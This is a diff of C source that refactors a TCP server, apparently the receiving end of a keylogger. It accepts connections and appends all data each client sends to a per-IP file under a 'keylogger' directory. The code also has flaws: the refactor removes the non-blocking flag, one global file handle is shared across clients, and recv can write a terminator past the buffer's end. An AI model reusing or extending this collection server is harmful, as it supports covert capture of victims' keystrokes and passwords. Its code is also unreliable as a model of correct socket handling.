@@ -23,29 +23,19 @@ typedef struct socket_info {
 
 SOCKETINFO *SocketInfoArray[FD_SETSIZE];
 
+FILE* fp;
+
 int AddSocketInfo(int sock);
 void RemoveSocketInfo(int nIndex);
-
-int main() {
-	int listenSocket = -1;
-	int clientSocket = -1;
-	struct sockaddr_in serverAddr, clientAddr;
-	char recvbuf[DEFAULT_BUFLEN];
-	int recvbuflen = DEFAULT_BUFLEN;
+int tcpConnect() {
+	int Lsocket = -1;
+	struct sockaddr_in serverAddr;
 	socklen_t addrlen;
 
-	int flags;
-	fd_set readfds;
-
-	char dir[100] = "/home/babo/keylogger/Ip_files";
-	char filename[100];
-	char filepath[200];
-	FILE *fp;
-
-	listenSocket = socket(AF_INET, SOCK_STREAM, 0);
-	if (listenSocket == -1) {
+	Lsocket = socket(AF_INET, SOCK_STREAM, 0);
+	if(Lsocket == -1) {
 		perror("socket failed");
-		return 1;
+		return -1;
 	}
 
 	memset(&serverAddr, 0, sizeof(serverAddr));
@@ -53,127 +43,175 @@ int main() {
 	serverAddr.sin_addr.s_addr = INADDR_ANY;
 	serverAddr.sin_port = htons(DEFAULT_PORT);
 
-	if (bind(listenSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
+	if (bind(Lsocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
 		perror("bind failed");
-		close(listenSocket);
-		return 1;
+		close(Lsocket);
+		return -1;
 	}
 
-	if (listen(listenSocket, SOMAXCONN) == -1) {
+	if (listen(Lsocket, SOMAXCONN) == -1) {
 		perror("listen failed");
-		close(listenSocket);
-		return 1;
+		close(Lsocket);
+		return -1;
 	}
-	
-	printf("Waiting for client...\n");
 
-	//nonblocking 처리
-	flags = fcntl(listenSocket, F_GETFL, 0);
+	return Lsocket;
 
+}
+
+int nonBlock(int Lsocket) {
+	int flags;
+
+	flags = fcntl(Lsocket, F_GETFL, 0);
 	if (flags < 0) {
 		perror("flags error");
-		close(listenSocket);
-		return 1;
+		close(Lsocket);
+		return -1;
 	}
 
-	flags = (flags | O_NONBLOCK);
-	if (fcntl(listenSocket, F_SETFL, flags) < 0) {
+	if(fcntl(Lsocket, F_SETFL, flags) < 0) {
 		perror("nonblocking flags error");
-		close(listenSocket);
-		return 1;
+		close(Lsocket);
+		return -1;
 	}
+	return 0;
+}
 
+int Callselect(int Lsocket, fd_set* fds) {
 	int max_fd, sd;
+	FD_ZERO(fds); //파일 디스크립터 세트 초기화
+	FD_SET(Lsocket, fds); // 리스닝 소켓 추가
+	max_fd = Lsocket;
 
-	while(1) {
-		FD_ZERO(&readfds);
-		FD_SET(listenSocket, &readfds); // 새로운 소켓 추가하는 것 
-		max_fd = listenSocket;
-		
-		for(int i = 0; i < nTotalSockets; i++) { // 기존 클라이언트들과 통신
-			sd = SocketInfoArray[i]->sock;
+	for(int i = 0; i < nTotalSockets; i++) { // 기존 클라이언트들과 통신
+		sd = SocketInfoArray[i]->sock;
 
-			if (sd > 0) {
-				FD_SET(sd, &readfds);
-			}
-
-			if (sd > max_fd) {
-				max_fd = sd;
-			}
+		if (sd > 0) { // 유효한 소켓만 추가
+			FD_SET(sd, fds);
 		}
 
-		//select() 호출
-		if(select(max_fd + 1, &readfds, NULL, NULL, NULL) < 0) {
-		       	perror("select error\n");
-			close(listenSocket);
-			exit(EXIT_FAILURE);
-			return 1;
+		if (sd > max_fd) { // 현재 소켓이 최대 파일 디스크립터보다 크면 갱신함. select에 연결할 갯수 구함.
+			max_fd = sd;
 		}
-
-		if(FD_ISSET(listenSocket, &readfds)) {
-			addrlen = sizeof(clientAddr);
-			clientSocket = accept(listenSocket, (struct sockaddr *)&clientAddr, &addrlen);
-			if (clientSocket < 0) {
-				perror("accept error\n");
-				continue;
-			}
-
-			//make file
-			sprintf(filename, "%s", inet_ntoa(clientAddr.sin_addr));
-			sprintf(filepath, "%s/%s", dir, filename);
-
-			fp = fopen(filepath, "a");
-			if (fp == NULL) {
-				perror("Cannot open file");
-				exit(EXIT_FAILURE);
-			}
-			printf("Client connected.\n"); 
-			printf("[TCP 서버] 클라이언트 접속: IP 주소=%s, 포트 번호=%d\n", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
-			FD_SET(clientSocket, &readfds);
-			AddSocketInfo(clientSocket);
-
-		}		
-
-		int iResult;
+	}
+	//select() 호출
+	if(select(max_fd + 1, fds, NULL, NULL, NULL) < 0) {
+		perror("select error\n");
+		close(Lsocket);
+		exit(EXIT_FAILURE);
+		return -1;
+	}
 	
-		for (int i = 0; i < nTotalSockets; i++) 
-		{ 
-			SOCKETINFO *ptr = SocketInfoArray[i];
+	return 0;
+}
 
-			if (FD_ISSET(ptr->sock, &readfds))  {
-				do {
-					iResult = recv(ptr->sock, ptr->buf, DEFAULT_BUFLEN, 0); //데이터 받기
-								
-					if (iResult > 0) {
-						ptr->buf[iResult] = '\0';
-					
-						//file
-						fprintf(fp, "%s", ptr->buf);
-						fflush(fp);
-						ptr->recvbytes = iResult;
-						addrlen = sizeof(clientAddr);
-						getpeername(ptr->sock, (struct sockaddr *)&clientAddr, &addrlen);
-					}
-					else if (iResult == 0) {	
-						printf("IP %s Connection closed.\n", inet_ntoa(clientAddr.sin_addr));
-						FD_CLR(ptr->sock, &readfds);
-						close(ptr->sock);
-						RemoveSocketInfo(i);
-						
-						fclose(fp);
-						
-						continue;
-					}
-					else {	
-						printf("recv failed with error");
-						 FD_CLR(ptr->sock, &readfds);                                                           close(ptr->sock);                                                                      RemoveSocketInfo(i); 
-						fclose(fp);
-						 continue;
-					}
-				} while (iResult > 0);
-			}
+void makeFile(struct sockaddr_in addr) {
+	char dir[100] = "/home/babo/keylogger/Ip_files";
+	char filename[100] = "";
+	char filepath[200] = "";
+
+	sprintf(filename, "%s", inet_ntoa(addr.sin_addr));
+	sprintf(filepath, "%s/%s", dir, filename);
+	fp = fopen(filepath, "a");
+	if (fp == NULL) {
+		perror("Cannot open file");
+		exit(EXIT_FAILURE);
+	}
+}
+
+int tcpAccept(int Lsocket, fd_set* fds, struct sockaddr_in* addr) {
+	socklen_t addrlen;
+	int Csocket = -1;
+
+	addrlen = sizeof(*addr);
+	Csocket = accept(Lsocket, (struct sockaddr*)addr, &addrlen);
+	if (Csocket < 0) {
+		perror("accept error\n");
+		return -1;
+	}
+	makeFile(*addr);
+
+	printf("Client connected.\n");
+	printf("[TCP 서버] 클라이언트 접속: IP 주소=%s, 포트 번호=%d\n", inet_ntoa(addr->sin_addr), ntohs(addr->sin_port));
+	FD_SET(Csocket, fds);
+	AddSocketInfo(Csocket);
+
+	return Csocket;
+}
+
+void tcpRecv(fd_set* fds, struct sockaddr_in* addr) {
+	int value;
+	socklen_t addrlen;
+
+	for(int i = 0; i < nTotalSockets; i++)
+	{
+		SOCKETINFO *ptr = SocketInfoArray[i];
+
+		if (FD_ISSET(ptr->sock, fds)) {
+			do {
+				value = recv(ptr->sock, ptr->buf, DEFAULT_BUFLEN, 0);
+				if(value > 0) {
+					ptr->buf[value] = '\0';
+
+					fprintf(fp, "%s", ptr->buf);
+					fflush(fp);
+					ptr->recvbytes = value;
+					addrlen = sizeof(*addr);
+					getpeername(ptr->sock, (struct sockaddr *)addr, &addrlen);
+				}
+				else if (value == 0) {
+					printf("IP %s Connection closed.\n", inet_ntoa(addr->sin_addr));
+					FD_CLR(ptr->sock, fds);
+					close(ptr->sock);
+					RemoveSocketInfo(i);
+
+					fclose(fp);
+
+					break;
+				}
+				else {
+					printf("recv failed with error");
+					FD_CLR(ptr->sock, fds);
+					close(ptr->sock);
+					RemoveSocketInfo(i);
+					fclose(fp);
+					break;
+				}
+			} while(value > 0);
 		}
-		
+	}
+}
+
+int main() {
+	//변수선언
+	int listenSocket, clientSocket = -1, value;
+	struct sockaddr_in clientAddr;
+	socklen_t addrlen;
+	fd_set readfds;
+	
+	//connect
+	listenSocket = tcpConnect();
+	if (listenSocket == -1) return 1;
+
+	printf("Waiting for client...\n");
+
+	//nonblocking
+	value = nonBlock(listenSocket);
+	if (value == -1) return 1;
+ 
+	while(1) {
+		//select
+		value = Callselect(listenSocket, &readfds);
+		if (value == -1) return 1;
+
+		//accept
+		if(FD_ISSET(listenSocket, &readfds)) { //새로운 클라이언트 연결 시 실행
+			clientSocket = tcpAccept(listenSocket, &readfds, &clientAddr);
+			if(clientSocket == -1) continue;
+		}
+
+		//receive
+		tcpRecv(&readfds, &clientAddr);
 	}
 
 	close(clientSocket);
@@ -181,7 +219,7 @@ int main() {
 	return 0;
 }	
 
-int AddSocketInfo(int clientSocket) {
+int AddSocketInfo(int clientSocket) { // select()할 목록에 소켓 추가.
 	if (nTotalSockets >= FD_SETSIZE) {
 		printf("Error: can't add socketinformation.\n");
 		return 0;
@@ -201,7 +239,7 @@ int AddSocketInfo(int clientSocket) {
 	return 1;
 }
 
-void RemoveSocketInfo(int nIndex) {
+void RemoveSocketInfo(int nIndex) { // select()할 목록에 소켓 삭제.
 	if (nIndex < 0 || nIndex >= nTotalSockets) {
 		return;
 	}
